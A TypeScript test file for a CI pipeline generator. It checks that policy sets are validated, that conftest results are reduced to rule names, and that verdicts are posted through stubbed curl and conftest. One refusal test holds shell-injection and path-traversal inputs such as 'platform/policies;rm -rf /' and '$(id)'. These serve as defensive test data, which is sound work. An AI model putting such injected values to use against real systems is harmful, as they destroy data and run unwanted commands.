
  test("a stack no set reaches is planned and summarised exactly as without policy", () => {
    const withOut = jobsOf(generatePipeline(plan({ stacks, select: ["app", "db", "net"] })));
    const jobs = jobsOf(generatePipeline(withPolicy()));
    expect(jobs["summary:net"]).toEqual(withOut["summary:net"]);
    expect((jobs["summary:net"] as Job).image.name).toBe(
      "registry.example.com/orch/ci-helper:1.0.0",
    );
    // and the plan jobs are never touched: the policy job holds the platform's token and nothing of the cloud's
    for (const n of ["app", "db", "net"]) expect(jobs[`plan:${n}`]).toEqual(withOut[`plan:${n}`]);
  });

  test("sets that no selected stack carries change nothing, and need no image", () => {
    const quiet = withPolicy({ sets: [{ ...SET, tag: "unused" }], image: undefined });
    expect(generatePipeline(quiet)).toBe(
      generatePipeline(plan({ stacks, select: ["app", "db", "net"] })),
    );
  });

  test("a stack that policy reaches with no image to judge it is an error, not a plan nobody judges", () => {
    const e = failure(() => generatePipeline(withPolicy({ image: undefined })));
    expect(e.problems).toEqual([
      expect.stringContaining('stack "app" is judged by policy'),
      expect.stringContaining('stack "db" is judged by policy'),
    ]);
    expect(
      failure(() => generatePipeline(withPolicy({ image: "Not An Image" }))).problems,
    ).toHaveLength(2);
    expect(failure(() => generatePipeline(withPolicy({ path: "runs/x" }))).problems[0]).toContain(
      "policy.path",
    );
  });

  test("a set that could reach a shell or a URL is refused, if it reaches a stack", () => {
    const bad: Partial<PolicySet>[] = [
      { source: "platform/policies;rm -rf /" },
      { source: "single" },
      { source: "../x/y" },
      { ref: "$(id)" },
      { ref: "a..b" },
      { ref: "-x" },
      { path: "/etc" },
      { path: "a/../b" },
      { path: "a b" },
    ];
    for (const over of bad) {
      const e = failure(() =>
        generatePipeline(withPolicy({ sets: [{ ...SET, tag: "pci", ...over }] })),
      );
      expect(e.problems.join("\n"), JSON.stringify(over)).toContain('policy set "prod-rules"');
    }
    // one set reaching two stacks is one complaint, not two
    const twice = failure(() =>
      generatePipeline(withPolicy({ sets: [{ ...SET, tag: "prod", source: "single" }] })),
    );
    expect(twice.problems.filter((p) => p.includes('policy set "prod-rules"'))).toHaveLength(1);
    // a bad set that reaches no selected stack is not this plan's problem
    expect(() =>
      generatePipeline(withPolicy({ sets: [{ ...SET, tag: "other", ref: "$(id)" }] })),
    ).not.toThrow();
  });

  test("an apply pipeline has no policy in it", () => {
    expect(
      generatePipeline(
        apply({ stacks, select: ["app", "db", "net"], planJobs: { app: 3, db: 2, net: 1 } }),
      ),
    ).not.toContain("conftest");
  });
});

describe("the policy filter", () => {
  const jq = Bun.which("jq");
  const run = async (input: string) => {
    const proc = Bun.spawn(
      [jq as string, "-e", "-c", "-s", "--arg", "stack", "db", POLICY_FILTER],
      {
        stdin: new TextEncoder().encode(input),
        stdout: "pipe",
        stderr: "pipe",
      },
    );
    const out = await new Response(proc.stdout).text();
    return { code: await proc.exited, out: out.trim() };
  };
  const fired = (failures: string[], warnings: string[] = []) =>
    JSON.stringify([
      {
        filename: "plan.json",
        namespace: "main",
        successes: 2,
        failures: failures.map((q) => ({ msg: "bucket x holds hunter2", metadata: { query: q } })),
        warnings: warnings.map((q) => ({ msg: "tag it, hunter2", metadata: { query: q } })),
      },
    ]);

  test.skipIf(!jq)("a result that fired nothing is an evaluation with nothing denied", async () => {
    // conftest leaves failures and warnings out when there are none
    const r = await run('[{"filename":"plan.json","namespace":"main","successes":3}]');
    expect(r.code).toBe(0);
    expect(JSON.parse(r.out)).toEqual({ stack: "db", evaluated: true, denied: [], warned: [] });
  });

  test.skipIf(!jq)("keeps the names of the rules that fired and never what they said", async () => {
    const r = await run(
      fired(
        ["data.main.deny_public", "data.main.deny_public", "data.terraform.deny_open_sg"],
        ["data.main.warn_tags"],
      ),
    );
    expect(JSON.parse(r.out)).toEqual({
      stack: "db",
      evaluated: true,
      denied: ["data.main.deny_public", "data.terraform.deny_open_sg"],
      warned: ["data.main.warn_tags"],
    });
    expect(r.out).not.toContain("hunter2");
  });

  test.skipIf(!jq)("results of several files and namespaces are all counted", async () => {
    const r = await run(
      JSON.stringify([
        { namespace: "a", failures: [{ msg: "m", metadata: { query: "data.a.deny" } }] },
        { namespace: "b", warnings: [{ msg: "m", metadata: { query: "data.b.warn" } }] },
      ]),
    );
    expect(JSON.parse(r.out)).toMatchObject({ denied: ["data.a.deny"], warned: ["data.b.warn"] });
  });

  test.skipIf(!jq)(
    "a rule with no name, or an odd one, is still named, in the alphabet the platform takes",
    async () => {
      const r = await run(
        JSON.stringify([
          {
            failures: [
              { msg: "m" },
              { msg: "m", metadata: { query: "data.main.deny[x] y`z" } },
              { msg: "m", metadata: { query: "x".repeat(300) } },
            ],
          },
        ]),
      );
      const { denied } = JSON.parse(r.out);
      expect(denied).toHaveLength(3);
      for (const d of denied) expect(/^[A-Za-z0-9_.:-]{1,200}$/.test(d), d).toBe(true); // core's POLICY_RULE; the API test holds the two together
    },
  );

  test.skipIf(!jq)("at most 50 rules are reported, and a denial stays one", async () => {
    const r = await run(fired(Array.from({ length: 80 }, (_, i) => `data.main.deny_${i}`)));
    const body = JSON.parse(r.out);
    expect(body.denied).toHaveLength(50);
  });

  // The cases a verdict must never be made of: jq fails (and with it the whole chain), so the job posts `evaluated: false`.
  for (const [what, input] of [
    ["nothing at all", ""],
    ["an empty list: nothing was judged", "[]"],
    ["an error message", "Error: running test: load: loading policies: no policies found"],
    ["an object, not a list", '{"error": "x"}'],
    ["null", "null"],
    ["a list whose results are not objects", '["x"]'],
  ] as const) {
    test.skipIf(!jq)(`${what} is an error, never an empty verdict`, async () => {
      expect((await run(input)).code).not.toBe(0);
    });
  }
});

describe("the policy lines of a summary job, as the runner's shell runs them", () => {
  const jq = Bun.which("jq");
  const tar = Bun.which("tar");
  const sh = !!jq && !!tar;
  let root: string;
  beforeAll(async () => {
    root = await mkdtemp(join(tmpdir(), "orch-policy-"));
    await mkdir(join(root, "bin"), { recursive: true });
    // curl: serves the policy archive for a download, records what is posted
    await writeFile(
      join(root, "bin/curl"),
      `#!/bin/sh
out=""; data=""; post=""
echo "$@" >> "$WORK/curl.log"
while [ $# -gt 0 ]; do
  case "$1" in
    --output) out="$2"; shift;;
    --data) data="\${2#@}"; shift;;
    --request) post="$2"; shift;;
  esac
  shift
done
if [ -n "$post" ]; then
  [ -n "$FAKE_POST_FAILS" ] && exit 22
  cp "$data" "$WORK/posted.json"
  exit 0
fi
[ -n "$FAKE_FETCH_FAILS" ] && exit 22
cp "$FIXTURE_TGZ" "$out"
`,
      { mode: 0o755 },
    );
    // conftest: prints a canned answer and exits as asked, like the real one (1 for a denial as well as for a failure)
    await writeFile(
      join(root, "bin/conftest"),
      `#!/bin/sh
echo "$@" > "$WORK/conftest.args"
[ -n "$FAKE_CONFTEST_OUT" ] && printf '%s' "$FAKE_CONFTEST_OUT"
exit \${FAKE_CONFTEST_EXIT:-0}
`,
      { mode: 0o755 },
    );
    // an archive as GitLab makes it: everything under one directory
    await mkdir(join(root, "src/policies-v1-abc/terraform"), { recursive: true });
    await writeFile(join(root, "src/policies-v1-abc/terraform/main.rego"), "package main\n");
    const p = Bun.spawn([
      "tar",
      "-czf",
      join(root, "fixture.tgz"),
      "-C",
      join(root, "src"),
      "policies-v1-abc",
    ]);
    await p.exited;
  });
  afterAll(async () => {
    await rm(root, { recursive: true, force: true });
  });

  const SETS: PolicySet[] = [
    { name: "rules", source: "platform/policies", ref: "v1", path: "terraform", tag: "prod" },
  ];
  const lines = () => {
    const job = jobsOf(
      generatePipeline(
        plan({
          stacks: [stack("db", { tags: ["prod"] })],
          select: ["db"],
          policy: {
            sets: SETS,
            image: "registry.example.com/orch/ci-policy:1",
            path: "/runs/r/policy-verdict",
          },
        }),
      ),
    )["summary:db"] as Job;
    return (job.script as string[]).slice(4); // after the login and the summary
  };

  /** Runs the policy lines in a fresh directory; says how each ended and what was posted. */
  async function run(env: Record<string, string> = {}) {
    const work = await mkdtemp(join(root, "job-"));
    await mkdir(join(work, "stacks/db"), { recursive: true });
    await writeFile(join(work, "stacks/db/plan.json"), "{}");
    const codes: number[] = [];
    for (const line of lines()) {
      const proc = Bun.spawn(["sh", "-c", line], {
        cwd: work,
        stderr: "pipe",
        env: {
          PATH: `${join(root, "bin")}:${process.env.PATH}`,
          WORK: work,
          FIXTURE_TGZ: join(root, "fixture.tgz"),
          CI_JOB_TOKEN: "job-token",
          CI_API_V4_URL: "https://gitlab.example.com/api/v4",
          ORCH_API_URL: "https://orch.example.com",
          ORCH_TOKEN: "orch-token",
          ...env,
        },
      });
      codes.push(await proc.exited);
    }
    const posted = await readFile(join(work, "posted.json"), "utf8").catch(() => undefined);
    return {
      codes,
      work,
      posted: posted === undefined ? undefined : JSON.parse(posted),
      raw: posted,
      conftest: await readFile(join(work, "conftest.args"), "utf8").catch(() => undefined),
    };
  }
  const result = (failures: string[] = [], warnings: string[] = []) =>
    JSON.stringify([
      {
        filename: "stacks/db/plan.json",
        namespace: "main",
        successes: 4,
        ...(failures.length
          ? { failures: failures.map((q) => ({ msg: "x holds hunter2", metadata: { query: q } })) }
          : {}),
        ...(warnings.length
          ? { warnings: warnings.map((q) => ({ msg: "y", metadata: { query: q } })) }
          : {}),
      },
    ]);

  test.skipIf(!sh)(
    "a plan that breaks no rule posts an evaluation with nothing in it",
    async () => {
      const r = await run({ FAKE_CONFTEST_OUT: result() });
      expect(r.codes).toEqual([0, 0]);
      expect(r.posted).toEqual({ stack: "db", evaluated: true, denied: [], warned: [] });
      // the set was fetched and unpacked where conftest was told to look
      expect(r.conftest).toContain("--policy policy/0/terraform stacks/db/plan.json");
      expect(await Bun.file(join(r.work, "policy/0/terraform/main.rego")).exists()).toBe(true);
    },
  );

  test.skipIf(!sh)("a warning is posted as a warning", async () => {
    const r = await run({ FAKE_CONFTEST_OUT: result([], ["data.main.warn_tags"]) });
    expect(r.posted).toEqual({
      stack: "db",
      evaluated: true,
      denied: [],
      warned: ["data.main.warn_tags"],
    });
  });

  test.skipIf(!sh)(
    "a denial is posted by name, however conftest exits, and without what it said",
    async () => {
      for (const code of ["0", "1"]) {
        const r = await run({
          FAKE_CONFTEST_OUT: result(["data.main.deny_public"]),
          FAKE_CONFTEST_EXIT: code,
        });
        expect(r.codes).toEqual([0, 0]);
        expect(r.posted).toEqual({
          stack: "db",
          evaluated: true,
          denied: ["data.main.deny_public"],
          warned: [],
        });
        expect(r.raw).not.toContain("hunter2");
      }
    },
  );

  test.skipIf(!sh)("a crashed evaluator posts a failed evaluation, not an empty one", async () => {
    // conftest dies with nothing on stdout; and with an error text there; and with a result that is not a list
    for (const out of [
      "",
      "Error: running test: load: loading policies: no policies found",
      '{"error":"x"}',
      "[]",
    ]) {
      const r = await run({ FAKE_CONFTEST_OUT: out, FAKE_CONFTEST_EXIT: "2" });
      expect(r.codes, out).toEqual([0, 0]);
      expect(r.posted, out).toEqual({ stack: "db", evaluated: false });
    }
  });

  test.skipIf(!sh)(
    "a set that cannot be fetched posts a failed evaluation, and conftest never runs",
    async () => {
      const r = await run({ FAKE_FETCH_FAILS: "1", FAKE_CONFTEST_OUT: result() });
      expect(r.codes).toEqual([0, 0]);
      expect(r.posted).toEqual({ stack: "db", evaluated: false });
      expect(r.conftest).toBeUndefined();
    },
  );

  test.skipIf(!sh)(
    "a verdict the platform did not take fails the job, which leaves it without one",
    async () => {
      const r = await run({ FAKE_CONFTEST_OUT: result(), FAKE_POST_FAILS: "1" });
      expect(r.codes[1]).not.toBe(0);
      expect(r.posted).toBeUndefined();
    },
  );
});
